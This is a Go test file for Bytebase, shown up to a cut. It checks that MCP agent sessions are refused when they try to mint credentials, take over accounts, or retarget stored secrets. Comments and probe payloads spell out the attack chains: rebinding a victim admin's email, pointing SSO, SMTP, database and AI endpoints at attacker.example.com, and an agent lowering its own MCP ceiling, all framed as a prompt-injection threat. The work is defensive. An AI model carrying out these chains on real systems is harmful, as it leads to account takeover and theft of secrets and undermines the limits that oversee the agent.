package tests

import (
	"bytes"
	"context"
	"encoding/json"
	"log"
	"log/slog"
	"net/http"
	"strings"
	"sync"
	"testing"

	"connectrpc.com/connect"
	"github.com/modelcontextprotocol/go-sdk/mcp"
	"github.com/stretchr/testify/require"
	"google.golang.org/protobuf/types/known/fieldmaskpb"

	v1pb "github.com/bytebase/bytebase/backend/generated-go/v1"
	"github.com/bytebase/bytebase/backend/generated-go/v1/v1connect"
)

// mcpAuditRows returns the audit rows an MCP session stored for one method.
// Filtering on McpDelegation is what makes a row attributable to the agent
// rather than to the same human working in the console.
// TestMCPReadOnlyCeilingRefusesAWrite reads a stored row through this, which
// keeps an empty result meaningful.
func mcpAuditRows(ctx context.Context, t *testing.T, ctl *controller, workspace, method string) []*v1pb.AuditLog {
	t.Helper()
	resp, err := ctl.auditLogServiceClient.SearchAuditLogs(ctx, connect.NewRequest(&v1pb.SearchAuditLogsRequest{
		Parent:  workspace,
		Filter:  `method == "` + method + `"`,
		OrderBy: "create_time desc",
	}))
	require.NoError(t, err)
	var rows []*v1pb.AuditLog
	for _, row := range resp.Msg.AuditLogs {
		if row.McpDelegation != nil {
			rows = append(rows, row)
		}
	}
	return rows
}

// searchAPIOnSession runs the search_api tool and returns the text an agent
// would read, which is the only place discovery results are surfaced.
func searchAPIOnSession(ctx context.Context, t *testing.T, session *mcp.ClientSession, arguments map[string]any) string {
	t.Helper()
	result, err := session.CallTool(ctx, &mcp.CallToolParams{Name: "search_api", Arguments: arguments})
	require.NoError(t, err)
	var sb strings.Builder
	for _, content := range result.Content {
		if text, ok := content.(*mcp.TextContent); ok {
			sb.WriteString(text.Text)
		}
	}
	return sb.String()
}

// TestMCPCannotMintCredentialsForOtherPrincipals runs the batch of escapes that
// the caller's-own-credential guards never reach.
//
// #21152 forbade the methods that rewrite or re-issue the CALLER's credential.
// Every one of those is eventually contained by acting on that one principal:
// revoke the OAuth grant, flip the workspace MCP switch, deactivate the human.
// The five calls below leave someone holding a principal that is not the
// caller, so none of those levers touch what they leave behind:
//
//   - CreateServiceAccount returns a plaintext bbs_ key for a brand new
//     principal (service_account_service.go, `result.ServiceKey = serviceKey`).
//   - UpdateServiceAccount{service_key} re-keys an EXISTING privileged account
//     and returns that plaintext too, with no proof of the old key.
//   - RotateDirectorySyncToken returns the plaintext SCIM token, which
//     authenticates directory writes outside the v1 API entirely.
//   - CreateUser makes a fresh end user with a password the caller chose — the
//     defect UpdateUser had, one method over, aimed at a new account instead of
//     the caller's own.
//   - UpdateEmail is that same "one method over" a second time, and it is the
//     one this batch found rather than was handed: it resolves its target from
//     the request rather than from the caller (user_service.go, GetUserByEmail
//     on request.Msg.Name), so it rebinds ANY account — a workspace admin's —
//     to an address the caller picked. RequestPasswordReset then mails the
//     reset code to whatever address that account now carries, and
//     ResetPassword sets the password for the account it resolves by email.
//     Both are allow_without_credential, so the attacker never needs an MCP
//     session for the second half: the agent moves the mailbox, and the
//     takeover completes from any browser.
//
// Every one is workspace-admin gated, and that is the target scenario rather
// than the mitigation: an admin runs the agent, and prompt injection does not
// need the agent to be hostile.
//
// The RED state is what the assertions are shaped around. With the annotations
// removed, the first call answers 200 with a bbs_ key in the body, the second
// with another one, the third with a SCIM token, the fourth creates a user
// whose password logs in, and the fifth moves another admin's account onto an
// address the session picked. All five run and all five are logged before
// anything is asserted, so an unguarded build reports the whole exposure
// instead of stopping at the first hit.
func TestMCPCannotMintCredentialsForOtherPrincipals(t *testing.T) {
	t.Parallel()
	a := require.New(t)
	ctx := context.Background()
	ctl, ctx := startWorkspace(ctx, t)

	workspace, err := ctl.workspaceServiceClient.GetWorkspace(ctx, connect.NewRequest(&v1pb.GetWorkspaceRequest{
		Name: "workspaces/-",
	}))
	a.NoError(err)
	workspaceName := workspace.Msg.Name

	// A service account the session did not create, so the re-key probe is
	// about taking over an existing privileged principal rather than about
	// finishing a creation it just made.
	const existingSAID = "ci-deployer"
	existing, err := ctl.serviceAccountServiceClient.CreateServiceAccount(ctx, connect.NewRequest(&v1pb.CreateServiceAccountRequest{
		Parent:           workspaceName,
		ServiceAccountId: existingSAID,
		ServiceAccount:   &v1pb.ServiceAccount{Title: "ci deployer"},
	}))
	a.NoError(err)
	a.True(strings.HasPrefix(existing.Msg.ServiceKey, "bbs_"),
		"precondition: the console really does hand back a plaintext key")
	existingSAName := existing.Msg.Name

	// A second human, so the UpdateEmail probe is unambiguously about another
	// principal rather than about the caller's own account.
	const victimEmail = "victim-admin@example.com"
	const attackerEmail = "attacker@example.com"
	_, err = ctl.userServiceClient.CreateUser(ctx, connect.NewRequest(&v1pb.CreateUserRequest{
		User: &v1pb.User{
			Title:    "victim admin",
			Email:    victimEmail,
			Password: "1024bytebase",
		},
	}))
	a.NoError(err)

	const mintedSAID = "agent-minted"
	const newUserEmail = "agent-created@example.com"
	const newUserPassword = "1024bytebase"

	session := openMCPSession(ctx, t, ctl, ctl.authInterceptor.token)
	defer session.Close()

	created := callAPIOnSession(ctx, t, session, "ServiceAccountService/CreateServiceAccount", map[string]any{
		"parent":           workspaceName,
		"serviceAccountId": mintedSAID,
		"serviceAccount":   map[string]any{"title": "agent minted"},
	})
	rekeyed := callAPIOnSession(ctx, t, session, "ServiceAccountService/UpdateServiceAccount", map[string]any{
		"serviceAccount": map[string]any{"name": existingSAName},
		"updateMask":     "serviceKey",
	})
	rotated := callAPIOnSession(ctx, t, session, "WorkspaceService/RotateDirectorySyncToken", map[string]any{
		"name": workspaceName,
	})
	newUser := callAPIOnSession(ctx, t, session, "UserService/CreateUser", map[string]any{
		"user": map[string]any{
			"email":    newUserEmail,
			"password": newUserPassword,
			"title":    "agent created",
		},
	})

	t.Logf("MCP CreateServiceAccount → status=%d error=%q serviceKey=%q",
		created.Status, created.Error, created.Response.ServiceKey)
	t.Logf("MCP UpdateServiceAccount{service_key} → status=%d error=%q serviceKey=%q",
		rekeyed.Status, rekeyed.Error, rekeyed.Response.ServiceKey)
	t.Logf("MCP RotateDirectorySyncToken → status=%d error=%q token=%q",
		rotated.Status, rotated.Error, rotated.Response.Token)
	rebound := callAPIOnSession(ctx, t, session, "UserService/UpdateEmail", map[string]any{
		"name":  "users/" + victimEmail,
		"email": attackerEmail,
	})
	t.Logf("MCP CreateUser → status=%d error=%q", newUser.Status, newUser.Error)
	t.Logf("MCP UpdateEmail{victim → attacker} → status=%d error=%q", rebound.Status, rebound.Error)

	for name, out := range map[string]mcpCallResult{
		"CreateServiceAccount":     created,
		"UpdateServiceAccount":     rekeyed,
		"RotateDirectorySyncToken": rotated,
		"CreateUser":               newUser,
		"UpdateEmail":              rebound,
	} {
		a.Equal(http.StatusForbidden, out.Status, "%s must be refused before dispatch", name)
		a.Contains(out.Error, "not available to MCP sessions",
			"%s must be refused by the FORBIDDEN gate, not by a handler precondition", name)
		a.Contains(out.Error, "principal other than the caller",
			"%s must name the reason for this class, not a caller's-own-credential one", name)
	}
	a.Empty(created.Response.ServiceKey, "an MCP session must never receive a service key")
	a.Empty(rekeyed.Response.ServiceKey, "an MCP session must never receive a rotated service key")
	a.Empty(rotated.Response.Token, "an MCP session must never receive the SCIM token")

	// The refusal has to come before the store write, not after it. These are
	// what discriminate a gate that denies ahead of dispatch from one that
	// denies once the credential already exists.
	accounts, err := ctl.serviceAccountServiceClient.ListServiceAccounts(ctx, connect.NewRequest(&v1pb.ListServiceAccountsRequest{
		Parent: workspaceName,
	}))
	a.NoError(err)
	for _, sa := range accounts.Msg.ServiceAccounts {
		a.NotContains(sa.Email, mintedSAID, "the service account must never have been created")
	}
	_, err = ctl.authServiceClient.Login(ctx, connect.NewRequest(&v1pb.LoginRequest{
		Email:    newUserEmail,
		Password: newUserPassword,
	}))
	a.Error(err, "the account the MCP session tried to create must not exist")

	// The victim's login identity is still the victim's. This is the assertion
	// that would fail loudest unguarded: the account would answer to the
	// attacker's address, and every reset code for it would go there.
	stillVictim, err := ctl.userServiceClient.GetUser(ctx, connect.NewRequest(&v1pb.GetUserRequest{
		Name: "users/" + victimEmail,
	}))
	a.NoError(err, "the victim's account must still answer to its own address")
	a.Equal(victimEmail, stillVictim.Msg.Email)
	_, err = ctl.userServiceClient.GetUser(ctx, connect.NewRequest(&v1pb.GetUserRequest{
		Name: "users/" + attackerEmail,
	}))
	a.Error(err, "the address the MCP session tried to rebind to must own no account")

	// All five are refused before their handlers, so none is stored.
	for method, label := range map[string]string{
		"/bytebase.v1.ServiceAccountService/CreateServiceAccount": "CreateServiceAccount",
		"/bytebase.v1.ServiceAccountService/UpdateServiceAccount": "UpdateServiceAccount",
		"/bytebase.v1.WorkspaceService/RotateDirectorySyncToken":  "RotateDirectorySyncToken",
		"/bytebase.v1.UserService/CreateUser":                     "CreateUser",
		"/bytebase.v1.UserService/UpdateEmail":                    "UpdateEmail",
	} {
		a.Empty(mcpAuditRows(ctx, t, ctl, workspaceName, method), "the refused %s is never stored", label)
	}

	// The console keeps working. The gate lives on the internal MCP chain, so
	// the same admin doing the same thing signed in is untouched.
	stillWorks, err := ctl.serviceAccountServiceClient.CreateServiceAccount(ctx, connect.NewRequest(&v1pb.CreateServiceAccountRequest{
		Parent:           workspaceName,
		ServiceAccountId: "console-made",
		ServiceAccount:   &v1pb.ServiceAccount{Title: "console made"},
	}))
	a.NoError(err, "a normal session must still be able to create a service account")
	a.True(strings.HasPrefix(stillWorks.Msg.ServiceKey, "bbs_"))
}

// TestMCPCannotWriteTrustAnchorsOrShipStoredSecrets covers the half of the class where no
// credential appears in the response at all — the session instead arranges for
// one to be issued later, or ships an existing secret out of the process.
//
//   - UpdateWorkloadIdentity chooses the OIDC issuer, audience and subject
//     that AuthService/ExchangeToken validates against (auth_service.go,
//     `wif.ValidateToken(ctx, request.Token, wicConfig)`). ExchangeToken is
//     allow_without_credential, so once the anchor is written the Bytebase
//     token is minted from outside, with no MCP session involved and nothing
//     left to revoke. CreateWorkloadIdentity makes the same choice. It is
//     WRITE, so this read-only session's ceiling refuses it, and under
//     Read-write the gate serves it only with the confirmation
//     administer_workspace attaches
//     (TestMCPCreatesAWorkloadIdentityAfterAConfirmation).
//   - Create/UpdateIdentityProvider are the same move against SSO login.
//   - TestIdentityProvider substitutes the STORED client secret whenever the
//     request omits it (idp_service.go, the two `ClientSecret == ""` branches)
//     and then talks to the token URL the caller supplied. The secret leaves on
//     the caller's chosen wire; nothing comes back in the body, which is why
//     the response assertions above cannot be the test for it.
//   - TestEmailSetting is that method's twin, found by sweeping for the shape
//     rather than by being reported: it substitutes the stored SMTP password
//     the same way (setting_service.go, `smtp.Password == ""`) and then
//     authenticates to the host and port the caller named. SMTP is not
//     incidental infrastructure here — it is the channel that delivers password
//     resets and email login codes, which is the credential-reset flow #21152
//     already put out of an agent's reach.
//
// The reads of both services stay served on purpose, and this test pins that:
// every read conversion blanks the secrets, and ListIdentityProviders is the
// unauthenticated login-page endpoint. They are also what proves the writes
// never landed.
func TestMCPCannotWriteTrustAnchorsOrShipStoredSecrets(t *testing.T) {
	t.Parallel()
	a := require.New(t)
	ctx := context.Background()
	ctl, ctx := startWorkspace(ctx, t)

	workspace, err := ctl.workspaceServiceClient.GetWorkspace(ctx, connect.NewRequest(&v1pb.GetWorkspaceRequest{
		Name: "workspaces/-",
	}))
	a.NoError(err)
	workspaceName := workspace.Msg.Name

	session := openMCPSession(ctx, t, ctl, ctl.authInterceptor.token)
	defer session.Close()

	const idpID = "agent-idp"
	idpBody := map[string]any{
		"identityProviderId": idpID,
		"identityProvider": map[string]any{
			"title":  "agent idp",
			"domain": "attacker.example.com",
			"type":   "OIDC",
			"config": map[string]any{
				"oidcConfig": map[string]any{
					"issuer":       "https://attacker.example.com",
					"clientId":     "agent",
					"clientSecret": "agent-secret",
					"fieldMapping": map[string]any{"identifier": "email"},
				},
			},
		},
	}
	createdIDP := callAPIOnSession(ctx, t, session, "IdentityProviderService/CreateIdentityProvider", idpBody)
	updatedIDP := callAPIOnSession(ctx, t, session, "IdentityProviderService/UpdateIdentityProvider", map[string]any{
		"identityProvider": map[string]any{
			"name":   "idps/" + idpID,
			"title":  "agent idp",
			"domain": "attacker.example.com",
			"type":   "OIDC",
			"config": idpBody["identityProvider"].(map[string]any)["config"],
		},
		"updateMask":   "config",
		"allowMissing": true,
	})
	// The exfiltration probe: no client secret in the request, so the handler
	// would fetch the stored one and carry it to this issuer.
	testedIDP := callAPIOnSession(ctx, t, session, "IdentityProviderService/TestIdentityProvider", map[string]any{
		"identityProvider": map[string]any{
			"name": "idps/" + idpID,
			"type": "OIDC",
			"config": map[string]any{
				"oidcConfig": map[string]any{
					"issuer":       "https://collector.attacker.example.com",
					"clientId":     "agent",
					"fieldMapping": map[string]any{"identifier": "email"},
				},
			},
		},
		"oidcContext": map[string]any{"code": "anything"},
	})

	const wiID = "agent-workload"
	wiConfig := map[string]any{
		"providerType":     "GITHUB",
		"issuerUrl":        "https://token.actions.githubusercontent.com",
		"allowedAudiences": []any{"bytebase"},
		"subjectPattern":   "repo:attacker/repo:ref:refs/heads/main",
	}
	createdWI := callAPIOnSession(ctx, t, session, "WorkloadIdentityService/CreateWorkloadIdentity", map[string]any{
		"parent":             workspaceName,
		"workloadIdentityId": wiID,
		"workloadIdentity": map[string]any{
			"title":                  "agent workload",
			"workloadIdentityConfig": wiConfig,
		},
	})
	updatedWI := callAPIOnSession(ctx, t, session, "WorkloadIdentityService/UpdateWorkloadIdentity", map[string]any{
		"workloadIdentity": map[string]any{
			"name":                   "workloadIdentities/" + wiID + "@workload.bytebase.com",
			"workloadIdentityConfig": wiConfig,
		},
		"updateMask": "workloadIdentityConfig",
	})

	// The same exfiltration shape one service over: no password in the request,
	// so the handler would fetch the stored one and authenticate to this host.
	testedEmail := callAPIOnSession(ctx, t, session, "SettingService/TestEmailSetting", map[string]any{
		"parent": workspaceName,
		"to":     "collector@attacker.example.com",
		"emailSetting": map[string]any{
			"from": "bytebase@example.com",
			"type": "SMTP",
			"smtp": map[string]any{
				"host":           "smtp.attacker.example.com",
				"port":           587,
				"username":       "collector",
				"encryption":     "ENCRYPTION_NONE",
				"authentication": "PLAIN",
			},
		},
	})

	probes := map[string]mcpCallResult{
		"CreateIdentityProvider": createdIDP,
		"UpdateIdentityProvider": updatedIDP,
		"TestIdentityProvider":   testedIDP,
		"UpdateWorkloadIdentity": updatedWI,
		"TestEmailSetting":       testedEmail,
	}
	t.Logf("MCP CreateWorkloadIdentity → status=%d error=%q", createdWI.Status, createdWI.Error)
	for name, out := range probes {
		t.Logf("MCP %s → status=%d error=%q", name, out.Status, out.Error)
	}
	for name, out := range probes {
		a.Equal(http.StatusForbidden, out.Status, "%s must be refused before dispatch", name)
		a.Contains(out.Error, "not available to MCP sessions",
			"%s must be refused by the FORBIDDEN gate", name)
		a.Contains(out.Error, "principal other than the caller",
			"%s must name this class's reason", name)
	}
	a.Equal(http.StatusForbidden, createdWI.Status, "CreateWorkloadIdentity must be refused before dispatch")
	a.Contains(createdWI.Error, "is a WRITE method", "the read-only ceiling refuses the create")

	// Nothing landed. Reading the listing rather than just the statuses above
	// is what discriminates a gate that refuses before dispatch from one that
	// refuses after the identity provider is written.
	//
	// The read is taken on the public chain rather than through the session.
	// It is not FORBIDDEN — TestForbiddenClassLeavesReadsAlone pins that it
	// never becomes so — but it is EXCLUDED as workspace administration, which
	// the ceiling gate refuses, so the agent's own read no longer answers this
	// question. The claim is about what reached the store either way.
	idpClient := v1connect.NewIdentityProviderServiceClient(ctl.client, ctl.rootURL,
		connect.WithInterceptors(&authInterceptor{token: ctl.authInterceptor.token}))
	idps, err := idpClient.ListIdentityProviders(ctx,
		connect.NewRequest(&v1pb.ListIdentityProvidersRequest{Parent: workspaceName}))
	a.NoError(err)
	for _, idp := range idps.Msg.IdentityProviders {
		a.NotContains(idp.Name, idpID, "the identity provider must never have been created")
		a.NotContains(idp.Domain, "attacker.example.com",
			"no part of the attacker's SSO config may have reached the store")
	}
	wis, err := ctl.workloadIdentityServiceClient.ListWorkloadIdentities(ctx, connect.NewRequest(&v1pb.ListWorkloadIdentitiesRequest{
		Parent: workspaceName,
	}))
	a.NoError(err)
	for _, wi := range wis.Msg.WorkloadIdentities {
		a.NotContains(wi.Email, wiID, "the workload identity must never have been written")
	}

	// All six are refused before their handlers, so none is stored. The stream
	// line's redaction of TestIdentityProvider's request is pinned by
	// TestMCPGateRefusalIsStreamedWithoutAnAuditAnnotation.
	for method, label := range map[string]string{
		"/bytebase.v1.IdentityProviderService/CreateIdentityProvider": "CreateIdentityProvider",
		"/bytebase.v1.IdentityProviderService/UpdateIdentityProvider": "UpdateIdentityProvider",
		"/bytebase.v1.WorkloadIdentityService/CreateWorkloadIdentity": "CreateWorkloadIdentity",
		"/bytebase.v1.WorkloadIdentityService/UpdateWorkloadIdentity": "UpdateWorkloadIdentity",
		"/bytebase.v1.IdentityProviderService/TestIdentityProvider":   "TestIdentityProvider (no audit annotation)",
		"/bytebase.v1.SettingService/TestEmailSetting":                "TestEmailSetting (no audit annotation)",
	} {
		a.Empty(mcpAuditRows(ctx, t, ctl, workspaceName, method), "the refused %s is never stored", label)
	}
}

// TestMCPCannotRetargetADataSource covers the same "carry a stored secret to a
// host the caller named" shape as the two Test methods, against the database's
// credentials rather than Bytebase's own.
//
// UpdateDataSource merges a partial request onto the STORED, already-decrypted
// data source: an update_mask naming only `host` keeps the stored password,
// ssl_key and ssh_private_key. With validate_only it dials the caller's host
// immediately (checkAndLogInstanceConnection → GetDataSourceDriver → Ping) and
// persists nothing, so the exfiltration leaves no trace in the instance record.
// Nothing filters the host on that path.
//
// A database user is a principal other than the caller, the same way the SMTP
// account behind TestEmailSetting is, so this shares their reason.
//
// The instance here needs no live database: CreateInstance only connects when
// validate_only is set, so a fabricated host with a stored password is enough
// to give the retarget something to inherit. In the RED state this probe
// reports the dial to the attacker host rather than a refusal.
func TestMCPCannotRetargetADataSource(t *testing.T) {
	t.Parallel()
	a := require.New(t)
	ctx := context.Background()
	ctl, ctx := startWorkspace(ctx, t)

	const storedDBPassword = "stored-db-secret"
	const realHost = "db.internal.example.com"
	const dataSourceID = "admin-ds"
	instance, err := ctl.instanceServiceClient.CreateInstance(ctx, connect.NewRequest(&v1pb.CreateInstanceRequest{
		InstanceId: "retarget-probe",
		Instance: &v1pb.Instance{
			Title:       "retarget probe",
			Engine:      v1pb.Engine_POSTGRES,
			Environment: new("environments/prod"),
			DataSources: []*v1pb.DataSource{{
				Id:       dataSourceID,
				Type:     v1pb.DataSourceType_ADMIN,
				Username: "bytebase",
				Password: storedDBPassword,
				Host:     realHost,
				Port:     "5432",
			}},
		},
	}))
	a.NoError(err, "precondition: an instance whose stored credential the retarget can inherit")

	session := openMCPSession(ctx, t, ctl, ctl.authInterceptor.token)
	defer session.Close()

	// update_mask names only the destination, so the stored password rides
	// along untouched; validate_only makes Bytebase dial it right now.
	retargeted := callAPIOnSession(ctx, t, session, "InstanceService/UpdateDataSource", map[string]any{
		"name":         instance.Msg.Name,
		"dataSource":   map[string]any{"id": dataSourceID, "host": "attacker.example.com"},
		"updateMask":   "host",
		"validateOnly": true,
	})
	t.Logf("MCP UpdateDataSource{host → attacker, validateOnly} → status=%d error=%q",
		retargeted.Status, retargeted.Error)

	a.Equal(http.StatusForbidden, retargeted.Status,
		"the retarget must be refused before Bytebase dials anything")
	a.Contains(retargeted.Error, "not available to MCP sessions")
	a.Contains(retargeted.Error, "principal other than the caller",
		"a database user is a principal too; the denial should say so")

	// Nothing moved. With validate_only the handler would not have persisted
	// anyway, so this pins the persisting variant rather than the one-shot: a
	// gate that let the call through without validate_only would show here.
	after, err := ctl.instanceServiceClient.GetInstance(ctx, connect.NewRequest(&v1pb.GetInstanceRequest{
		Name: instance.Msg.Name,
	}))
	a.NoError(err)
	a.Len(after.Msg.DataSources, 1)
	a.Equal(realHost, after.Msg.DataSources[0].Host,
		"the data source must still point where the operator put it")

	// The same retarget WITHOUT validate_only, denied identically.
	persisting := callAPIOnSession(ctx, t, session, "InstanceService/UpdateDataSource", map[string]any{
		"name":       instance.Msg.Name,
		"dataSource": map[string]any{"id": dataSourceID, "host": "attacker.example.com"},
		"updateMask": "host",
	})
	a.Equal(http.StatusForbidden, persisting.Status)

	workspace, err := ctl.workspaceServiceClient.GetWorkspace(ctx, connect.NewRequest(&v1pb.GetWorkspaceRequest{
		Name: "workspaces/-",
	}))
	a.NoError(err)
	// Both are refused before the handler, so neither is stored. That the
	// validate_only flag does not drop the refusal's stream line is pinned by
	// TestAuditSinks.
	a.Empty(mcpAuditRows(ctx, t, ctl, workspace.Msg.Name, "/bytebase.v1.InstanceService/UpdateDataSource"),
		"a gate refusal is never stored")

	// The console keeps working — the gate is on the internal MCP chain only.
	_, err = ctl.instanceServiceClient.UpdateDataSource(ctx, connect.NewRequest(&v1pb.UpdateDataSourceRequest{
		Name:       instance.Msg.Name,
		DataSource: &v1pb.DataSource{Id: dataSourceID, Port: "5433"},
		UpdateMask: &fieldmaskpb.FieldMask{Paths: []string{"port"}},
	}))
	a.NoError(err, "a normal session must still be able to update a data source")
}

// TestMCPCannotRewriteItsOwnCeiling pins that a READ_WRITE session cannot change
// the settings that bound it.
//
// SettingService/UpdateSetting writes value.mcp.capability, which IS the MCP
// ceiling. The same method keeps the stored SMTP password when value.email.smtp
// omits it while accepting a new host, and keeps the stored AI key when the mask
// names only the endpoint. The gate serves it only with a confirmation that
// administer_workspace issues for the approval rules alone, and call_api cannot
// carry one.
//
// The ceiling assertion is the load-bearing one: it reads the setting back
// through the console afterwards, so this discriminates a gate that refuses
// before dispatch from one that refuses after the store write.
func TestMCPCannotRewriteItsOwnCeiling(t *testing.T) {
	t.Parallel()
	a := require.New(t)
	ctx := context.Background()
	ctl, ctx := startWorkspace(ctx, t)

	workspace, err := ctl.workspaceServiceClient.GetWorkspace(ctx, connect.NewRequest(&v1pb.GetWorkspaceRequest{
		Name: "workspaces/-",
	}))
	a.NoError(err)

	a.NoError(ctl.setMCPCapability(ctx, v1pb.MCPSetting_READ_WRITE))
	ceilingBefore, err := ctl.getMCPCapability(ctx)
	a.NoError(err)

	// Seed the two settings the retarget vectors merge into. Without a stored
	// setting the handler answers NotFound, so an unguarded build would report
	// 404 rather than the retarget landing — the assertions below would pass
	// for the wrong reason, and the RED state would prove nothing.
	const storedSMTPPassword = "stored-smtp-secret"
	const storedAPIKey = "stored-api-key"
	_, err = ctl.settingServiceClient.UpdateSetting(ctx, connect.NewRequest(&v1pb.UpdateSettingRequest{
		Setting: &v1pb.Setting{
			Name: "settings/EMAIL",
			Value: &v1pb.SettingValue{Value: &v1pb.SettingValue_Email{Email: &v1pb.EmailSetting{
				From: "bytebase@example.com",
				Type: v1pb.EmailSetting_SMTP,
				Config: &v1pb.EmailSetting_Smtp{Smtp: &v1pb.EmailSetting_SMTPConfig{
					Host: "smtp.example.com", Port: 587, Username: "bytebase", Password: storedSMTPPassword,
				}},
			}}},
		},
		UpdateMask:   &fieldmaskpb.FieldMask{Paths: []string{"value.email.from", "value.email.type", "value.email.smtp"}},
		AllowMissing: true,
	}))
	a.NoError(err, "precondition: a stored SMTP config for the retarget to inherit")
	_, err = ctl.settingServiceClient.UpdateSetting(ctx, connect.NewRequest(&v1pb.UpdateSettingRequest{
		Setting: &v1pb.Setting{
			Name: "settings/AI",
			Value: &v1pb.SettingValue{Value: &v1pb.SettingValue_Ai{Ai: &v1pb.AISetting{
				Enabled: true, Provider: v1pb.AISetting_OPEN_AI,
				Endpoint: "https://api.openai.com", ApiKey: storedAPIKey, Model: "gpt-4",
			}}},
		},
		UpdateMask:   &fieldmaskpb.FieldMask{Paths: []string{"value.ai.enabled", "value.ai.provider", "value.ai.endpoint", "value.ai.api_key", "value.ai.model"}},
		AllowMissing: true,
	}))
	a.NoError(err, "precondition: a stored AI key for the retarget to inherit")

	session := openMCPSession(ctx, t, ctl, ctl.authInterceptor.token)
	defer session.Close()

	rewritten := callAPIOnSession(ctx, t, session, "SettingService/UpdateSetting", map[string]any{
		"setting": map[string]any{
			"name":  "settings/MCP",
			"value": map[string]any{"mcp": map[string]any{"capability": "DISABLED"}},
		},
		"updateMask": "value.mcp.capability",
	})
	redirected := callAPIOnSession(ctx, t, session, "SettingService/UpdateSetting", map[string]any{
		"setting": map[string]any{
			"name": "settings/EMAIL",
			"value": map[string]any{"email": map[string]any{
				"from": "bytebase@example.com",
				"type": "SMTP",
				"smtp": map[string]any{"host": "smtp.attacker.example.com", "port": 587, "username": "collector"},
			}},
		},
		"updateMask": "value.email.smtp",
	})

	// The third vector, and the one that crosses the tenant boundary in SaaS:
	// a mask naming only the endpoint keeps the stored API key, and
	// AIService/Chat then posts to that endpoint with the key in a header. The
	// stored key there is Bytebase's own platform key, seeded per workspace.
	retargeted := callAPIOnSession(ctx, t, session, "SettingService/UpdateSetting", map[string]any{
		"setting": map[string]any{
			"name":  "settings/AI",
			"value": map[string]any{"ai": map[string]any{"endpoint": "https://collector.attacker.example.com"}},
		},
		"updateMask": "value.ai.endpoint",
	})

	t.Logf("MCP UpdateSetting{mcp_capability: DISABLED} → status=%d error=%q", rewritten.Status, rewritten.Error)
	t.Logf("MCP UpdateSetting{email.smtp → attacker} → status=%d error=%q", redirected.Status, redirected.Error)
	t.Logf("MCP UpdateSetting{ai.endpoint → attacker} → status=%d error=%q", retargeted.Status, retargeted.Error)

	for name, out := range map[string]mcpCallResult{
		"ceiling":     rewritten,
		"smtp relay":  redirected,
		"ai endpoint": retargeted,
	} {
		a.Equal(http.StatusForbidden, out.Status, "the %s write must be refused before dispatch", name)
		a.Contains(out.Error, "carries no such confirmation", "the %s write must be refused by the gate", name)
		a.Contains(out.Error, "Change other settings signed in to the Bytebase console",
			"the %s denial must send the user to the console", name)
	}

	after, err := ctl.getMCPCapability(ctx)
	a.NoError(err)
	a.Equal(ceilingBefore, after,
		"the session must not have moved the ceiling that governs it")

	// The destinations are still ours. Reads blank the secrets themselves, so
	// the host and endpoint are what there is to check — and they are the whole
	// vector: the stored secret travels to whatever address is recorded here.
	email, err := ctl.settingServiceClient.GetSetting(ctx, connect.NewRequest(&v1pb.GetSettingRequest{
		Name: "settings/EMAIL",
	}))
	a.NoError(err)
	a.Equal("smtp.example.com", email.Msg.GetValue().GetEmail().GetSmtp().GetHost(),
		"the mail relay that carries password resets must not have moved")
	ai, err := ctl.settingServiceClient.GetSetting(ctx, connect.NewRequest(&v1pb.GetSettingRequest{
		Name: "settings/AI",
	}))
	a.NoError(err)
	a.Equal("https://api.openai.com", ai.Msg.GetValue().GetAi().GetEndpoint(),
		"the endpoint the stored API key is sent to must not have moved")

	a.Empty(mcpAuditRows(ctx, t, ctl, workspace.Msg.Name, "/bytebase.v1.SettingService/UpdateSetting"),
		"a gate refusal is never stored")

	// The console keeps working: the gate is on the internal MCP chain only.
	a.NoError(ctl.setMCPCapability(ctx, v1pb.MCPSetting_READ_ONLY),
		"a normal session must still be able to write workspace settings")

	moved, err := ctl.getMCPCapability(ctx)
	a.NoError(err)
	a.Equal(v1pb.MCPSetting_READ_ONLY, moved,
		"the console write must actually land — otherwise the denial above proves nothing about the gate")
}

// TestMCPResetFlowRefusalsAreStreamed pins the stream line of a gate refusal
// on the three allow_without_credential reset-flow methods.
//
// An unauthenticated caller of these methods could name any workspace, so the
// audit interceptor takes their parent only from what the handler validated
// (handlerValidatedWorkspaceMethod, audit.go). The gate refuses before the
// handler runs, so no handler ever validates one. A request carrying a
// delegated grant is the exception: the internal MCP chain already bound a
// verified workspace, and the line is filed under it.
//
// Not parallel: it captures slog.Default.
func TestMCPResetFlowRefusalsAreStreamed(t *testing.T) {
	a := require.New(t)
	ctx := context.Background()
	lines := captureAuditStream(t)
	ctl, ctx := startWorkspace(ctx, t)
	ctl.profile.RuntimeEnableAuditLogStdout.Store(true)

	workspace, err := ctl.workspaceServiceClient.GetWorkspace(ctx, connect.NewRequest(&v1pb.GetWorkspaceRequest{
		Name: "workspaces/-",
	}))
	a.NoError(err)
	workspaceName := workspace.Msg.Name

	session := openMCPSession(ctx, t, ctl, ctl.authInterceptor.token)
	defer session.Close()

	// The positive control: UpdateUser is FORBIDDEN and not carved out, so its
	// refusal streams a line whatever the carve-out does.
	control := callAPIOnSession(ctx, t, session, "UserService/UpdateUser", map[string]any{
		"user":       map[string]any{"name": "users/demo@example.com", "password": "2048bytebase"},
		"updateMask": "password",
	})
	a.Equal(http.StatusForbidden, control.Status)

	probes := map[string]mcpCallResult{
		"RequestPasswordReset": callAPIOnSession(ctx, t, session, "AuthService/RequestPasswordReset", map[string]any{
			"email":     "demo@example.com",
			"workspace": workspaceName,
		}),
		"ResetPassword": callAPIOnSession(ctx, t, session, "AuthService/ResetPassword", map[string]any{
			"email":       "demo@example.com",
			"code":        "000000",
			"newPassword": "2048bytebase",
		}),
		"SendEmailLoginCode": callAPIOnSession(ctx, t, session, "AuthService/SendEmailLoginCode", map[string]any{
			"email":     "demo@example.com",
			"workspace": workspaceName,
		}),
	}
	for name, out := range probes {
		a.Equal(http.StatusForbidden, out.Status, "%s must be refused", name)
		a.Contains(out.Error, "not available to MCP sessions", "%s must be refused by the gate", name)
	}

	for _, method := range []string{
		"/bytebase.v1.UserService/UpdateUser",
		"/bytebase.v1.AuthService/RequestPasswordReset",
		"/bytebase.v1.AuthService/ResetPassword",
		"/bytebase.v1.AuthService/SendEmailLoginCode",
	} {
		a.Empty(mcpAuditRows(ctx, t, ctl, workspaceName, method), "the refused %s is never stored", method)
		var matched []map[string]any
		for _, line := range lines() {
			if line["method"] == method && lineFlag(line, "mcp") {
				matched = append(matched, line)
			}
		}
		a.Len(matched, 1, "the refused %s is streamed once", method)
		a.Equal(workspaceName, matched[0]["parent"],
			"the line is filed under the workspace the MCP credential was bound to, not one the caller named")
